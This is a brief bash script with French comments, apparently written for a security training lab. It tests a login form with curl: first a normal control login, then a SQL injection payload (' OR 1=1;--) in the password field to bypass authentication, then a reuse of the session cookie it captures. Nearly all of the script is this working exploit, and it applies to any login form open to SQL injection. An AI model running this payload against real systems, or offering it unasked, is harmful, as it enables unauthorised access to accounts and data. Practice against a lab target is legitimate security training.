#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
echo "=== login normal (temoin) ==="
curl -s -m 20 -i --data-urlencode "username=a" --data-urlencode "password=b" "$B/" | tail -12
echo
echo "=== injection dans le PASSWORD ==="
curl -s -m 20 -c /tmp/cj3.txt -i --data-urlencode "username=a" --data-urlencode "password=' OR 1=1;--" "$B/" | tail -20
echo
echo "=== suite avec cookie ==="
curl -s -m 20 -b /tmp/cj3.txt "$B/" | head -50
